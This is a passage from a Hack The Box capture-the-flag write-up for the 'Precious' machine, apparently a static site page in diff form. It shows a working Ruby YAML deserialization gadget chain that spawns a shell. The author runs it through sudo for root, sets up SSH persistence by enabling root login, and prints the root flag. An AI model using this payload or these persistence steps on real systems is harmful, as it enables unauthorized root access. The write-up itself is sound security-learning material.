+</span><span class="z-source z-ruby">        <span class="z-keyword z-control z-ruby">if</span><span class="z-punctuation z-definition z-group z-begin z-ruby">(</span>file_name <span class="z-keyword z-operator z-comparison z-ruby">==</span> local_name<span class="z-punctuation z-definition z-group z-end z-ruby">)</span>
+</span><span class="z-source z-ruby">            <span class="z-keyword z-control z-ruby">if</span><span class="z-punctuation z-definition z-group z-begin z-ruby">(</span>file_version <span class="z-keyword z-operator z-comparison z-ruby">!=</span> local_version<span class="z-punctuation z-definition z-group z-end z-ruby">)</span>
+</span><span class="z-source z-ruby">                <span class="z-support z-function z-builtin z-ruby">puts</span> <span class="z-meta z-string z-ruby"><span class="z-string z-quoted z-double z-ruby"><span class="z-punctuation z-definition z-string z-begin z-ruby">&quot;</span>Installed version differs from the one specified in file: <span class="z-punctuation z-definition z-string z-end z-ruby">&quot;</span></span></span> <span class="z-keyword z-operator z-arithmetic z-ruby">+</span> local_name
+</span><span class="z-source z-ruby">            <span class="z-keyword z-control z-ruby">else</span>
+</span><span class="z-source z-ruby">                <span class="z-support z-function z-builtin z-ruby">puts</span> <span class="z-meta z-string z-ruby"><span class="z-string z-quoted z-double z-ruby"><span class="z-punctuation z-definition z-string z-begin z-ruby">&quot;</span>Installed version is equals to the one specified in file: <span class="z-punctuation z-definition z-string z-end z-ruby">&quot;</span></span></span> <span class="z-keyword z-operator z-arithmetic z-ruby">+</span> local_name
+</span><span class="z-source z-ruby">            <span class="z-keyword z-control z-ruby">end</span>
+</span><span class="z-source z-ruby">        <span class="z-keyword z-control z-ruby">end</span>
+</span><span class="z-source z-ruby">    <span class="z-keyword z-control z-ruby">end</span>
+</span></code></pre>
+<p>The <code>load</code> function is used for deserialization. Interestingly, it deserializes
+the <code>dependencies.yml</code> located in the current directory, so we can create our
+own YAML file.</p>
+<p>This means that by crafting a custom YAML file, we could execute arbitrary
+commands! And since we can execute this script as <code>root</code>, we would get <code>root</code>'s
+privileges.</p>
+<h2 id="privilege-escalation-ruby-deserialization">Privilege escalation (Ruby deserialization)</h2>
+<p>Deserialization is a process taking data that has been structured in a specific
+format, and reconstructing it back into an object. It's the opposite of
+serialization.</p>
+<p>Since we have control over the deserialized file in this script, we should be
+able to execute arbitrary commands. And since we can execute this script as
+<code>root</code>, we would get <code>root</code>'s privileges!</p>
+<h3 id="preparation-1">Preparation</h3>
+<p>The goal is to obtain an elevated shell.</p>
+<p>I'll select a payload from
+<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Ruby.md">PayloadAllTheThings</a>
+to exploit this vulnerability.</p>
+<p>However, there's two gadgets to choose from depending on the Ruby version in
+use, so let's retrieve Precious's Ruby version.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">henry@precious:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> ruby<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>v</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">ruby 2.7.4p191 (2021-07-07 revision a21a3b7d23) [x86_64-linux-gnu]
+</span></code></pre>
+<p>Therefore, I'll choose the one for Ruby versions after <code>2.7.3</code>.</p>
+<p>However, we still need to come up with a payload to use with the YAML gadget! I
+want to obtain an elevated shell, so I'll just execute <code>/bin/bash</code>.</p>
+<p>Then, I'll create a <code>dependencies.yml</code> file in <code>/tmp</code> to execute this binary:</p>
+<pre data-lang="yml" class="language-yml z-code"><code class="language-yml" data-lang="yml"><span class="z-source z-yaml"><span class="z-entity z-other z-document z-begin z-yaml">---</span>
+</span><span class="z-source z-yaml"><span class="z-punctuation z-definition z-block z-sequence z-item z-yaml">-</span> <span class="z-meta z-property z-yaml"><span class="z-storage z-type z-tag-handle z-yaml">!ruby/object:Gem::Installer</span></span>
+</span><span class="z-source z-yaml">  <span class="z-string z-unquoted z-plain z-out z-yaml"><span class="z-entity z-name z-tag z-yaml">i</span></span><span class="z-punctuation z-separator z-key-value z-mapping z-yaml">:</span> <span class="z-string z-unquoted z-plain z-out z-yaml">x</span>
+</span><span class="z-source z-yaml"><span class="z-punctuation z-definition z-block z-sequence z-item z-yaml">-</span> <span class="z-meta z-property z-yaml"><span class="z-storage z-type z-tag-handle z-yaml">!ruby/object:Gem::SpecFetcher</span></span>
+</span><span class="z-source z-yaml">  <span class="z-string z-unquoted z-plain z-out z-yaml"><span class="z-entity z-name z-tag z-yaml">i</span></span><span class="z-punctuation z-separator z-key-value z-mapping z-yaml">:</span> <span class="z-constant z-language z-boolean z-yaml">y</span>
+</span><span class="z-source z-yaml"><span class="z-punctuation z-definition z-block z-sequence z-item z-yaml">-</span> <span class="z-meta z-property z-yaml"><span class="z-storage z-type z-tag-handle z-yaml">!ruby/object:Gem::Requirement</span></span>
+</span><span class="z-source z-yaml">  <span class="z-string z-unquoted z-plain z-out z-yaml"><span class="z-entity z-name z-tag z-yaml">requirements</span></span><span class="z-punctuation z-separator z-key-value z-mapping z-yaml">:</span> <span class="z-meta z-property z-yaml"><span class="z-storage z-type z-tag-handle z-yaml">!ruby/object:Gem::Package::TarReader</span></span>
+</span><span class="z-source z-yaml">    <span class="z-string z-unquoted z-plain z-out z-yaml"><span class="z-entity z-name z-tag z-yaml">io</span></span><span class="z-punctuation z-separator z-key-value z-mapping z-yaml">:</span> <span class="z-meta z-property z-yaml"><span class="z-storage z-type z-tag-handle z-yaml">!ruby/object:Net::BufferedIO</span></span> <span class="z-meta z-property z-yaml"><span class="z-keyword z-control z-property z-anchor z-yaml"><span class="z-punctuation z-definition z-anchor z-yaml">&amp;</span></span><span class="z-entity z-name z-other z-anchor z-yaml">1</span></span>
+</span><span class="z-source z-yaml">      <span class="z-string z-unquoted z-plain z-out z-yaml"><span class="z-entity z-name z-tag z-yaml">io</span></span><span class="z-punctuation z-separator z-key-value z-mapping z-yaml">:</span> <span class="z-meta z-property z-yaml"><span class="z-storage z-type z-tag-handle z-yaml">!ruby/object:Gem::Package::TarReader::Entry</span></span> <span class="z-meta z-property z-yaml"><span class="z-keyword z-control z-property z-anchor z-yaml"><span class="z-punctuation z-definition z-anchor z-yaml">&amp;</span></span><span class="z-entity z-name z-other z-anchor z-yaml">1</span></span>
+</span><span class="z-source z-yaml">        <span class="z-string z-unquoted z-plain z-out z-yaml"><span class="z-entity z-name z-tag z-yaml">read</span></span><span class="z-punctuation z-separator z-key-value z-mapping z-yaml">:</span> <span class="z-constant z-numeric z-integer z-decimal z-yaml">0</span>
+</span><span class="z-source z-yaml">        <span class="z-string z-unquoted z-plain z-out z-yaml"><span class="z-entity z-name z-tag z-yaml">header</span></span><span class="z-punctuation z-separator z-key-value z-mapping z-yaml">:</span> <span class="z-string z-quoted z-double z-yaml"><span class="z-punctuation z-definition z-string z-begin z-yaml">&quot;</span>abc<span class="z-punctuation z-definition z-string z-end z-yaml">&quot;</span></span>
+</span><span class="z-source z-yaml">      <span class="z-string z-unquoted z-plain z-out z-yaml"><span class="z-entity z-name z-tag z-yaml">debug_output</span></span><span class="z-punctuation z-separator z-key-value z-mapping z-yaml">:</span> <span class="z-meta z-property z-yaml"><span class="z-storage z-type z-tag-handle z-yaml">!ruby/object:Net::WriteAdapter</span></span> <span class="z-meta z-property z-yaml"><span class="z-keyword z-control z-property z-anchor z-yaml"><span class="z-punctuation z-definition z-anchor z-yaml">&amp;</span></span><span class="z-entity z-name z-other z-anchor z-yaml">1</span></span>
+</span><span class="z-source z-yaml">        <span class="z-string z-unquoted z-plain z-out z-yaml"><span class="z-entity z-name z-tag z-yaml">socket</span></span><span class="z-punctuation z-separator z-key-value z-mapping z-yaml">:</span> <span class="z-meta z-property z-yaml"><span class="z-storage z-type z-tag-handle z-yaml">!ruby/object:Gem::RequestSet</span></span> <span class="z-meta z-property z-yaml"><span class="z-keyword z-control z-property z-anchor z-yaml"><span class="z-punctuation z-definition z-anchor z-yaml">&amp;</span></span><span class="z-entity z-name z-other z-anchor z-yaml">1</span></span>
+</span><span class="z-source z-yaml">          <span class="z-string z-unquoted z-plain z-out z-yaml"><span class="z-entity z-name z-tag z-yaml">sets</span></span><span class="z-punctuation z-separator z-key-value z-mapping z-yaml">:</span> <span class="z-meta z-property z-yaml"><span class="z-storage z-type z-tag-handle z-yaml">!ruby/object:Net::WriteAdapter</span></span>
+</span><span class="z-source z-yaml">            <span class="z-string z-unquoted z-plain z-out z-yaml"><span class="z-entity z-name z-tag z-yaml">socket</span></span><span class="z-punctuation z-separator z-key-value z-mapping z-yaml">:</span> <span class="z-meta z-property z-yaml"><span class="z-storage z-type z-tag-handle z-yaml">!ruby/module</span></span> <span class="z-string z-quoted z-double z-yaml"><span class="z-punctuation z-definition z-string z-begin z-yaml">&quot;</span>Kernel<span class="z-punctuation z-definition z-string z-end z-yaml">&quot;</span></span>
+</span><span class="z-source z-yaml">            <span class="z-string z-unquoted z-plain z-out z-yaml"><span class="z-entity z-name z-tag z-yaml">method_id</span></span><span class="z-punctuation z-separator z-key-value z-mapping z-yaml">:</span> <span class="z-string z-unquoted z-plain z-out z-yaml">:system</span>
+</span><span class="z-source z-yaml">          <span class="z-string z-unquoted z-plain z-out z-yaml"><span class="z-entity z-name z-tag z-yaml">git_set</span></span><span class="z-punctuation z-separator z-key-value z-mapping z-yaml">:</span> <span class="z-string z-unquoted z-plain z-out z-yaml">/bin/bash -i</span>
+</span><span class="z-source z-yaml">        <span class="z-string z-unquoted z-plain z-out z-yaml"><span class="z-entity z-name z-tag z-yaml">method_id</span></span><span class="z-punctuation z-separator z-key-value z-mapping z-yaml">:</span> <span class="z-string z-unquoted z-plain z-out z-yaml">:resolve</span>
+</span></code></pre>
+<h3 id="exploitation-1">Exploitation</h3>
+<p>Let's exploit the Ruby deserialization vulnerability to execute our payload:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">henry@precious:/tmp$</span></span><span class="z-meta z-function-call z-arguments z-shell"> sudo <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/usr/bin/ruby<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/opt/update_dependencies.rb<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">root@precious:/tmp#
+</span></code></pre>
+<p>Yay!</p>
+<h3 id="establishing-persistence">Establishing persistence</h3>
+<p>Let's use SSH to establish persistence.</p>
+<p>Our home folder doesn't contain a <code>.ssh</code> folder, so I'll create one. Then I'll
+create a private key, and I'll add the corresponding public key to
+<code>authorized_keys</code>.</p>
+<p>It won't be enough to connect over SSH to Precious though, since the
+<code>/etc/ssh/sshd_config</code> has the line <code>PermitRootLogin no</code>. I'll set it to <code>yes</code>,
+and I'll restart the SSH service.</p>
+<p>Finally, I'll connect over SSH to Precious as <code>root</code>.</p>
+<h2 id="system-enumeration-2">System enumeration</h2>
+<p>If we run <code>whoami</code>, we see that we're <code>root</code>!</p>
+<h3 id="flags-1">Flags</h3>
+<p>As usual, we can find the root flag in our home folder.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">root@precious:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>#</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/root/root.txt<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">827807d318ec9d8941ea005dcd767bdf
+</span></code></pre>
+<h1 id="afterwords">Afterwords</h1>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/precious/success.png" alt="Success" /></p>
+<p>That's it for this box! 🎉</p>
+<p>I rated both the user and root flags as 'Easy' to obtain. The foothold was quite
+easy to identify and fairly straightforward to exploit. The privilege escalation
+was a bit harder to identify, since it involved first moving laterally from
+<code>ruby</code> to <code>henry</code>, and then identifying a deserialization vulnerability in a
+Ruby script. Thanks to
+<a href="https://github.com/swisskyrepo/PayloadsAllTheThings">PayloadAllTheThings</a>, it
+was really easy to exploit though.</p>
+<p>Thanks for reading!</p>
+</section>
+</article>
+
+    </main>
+
+        <footer></footer>
+
+    </body>
+</html>
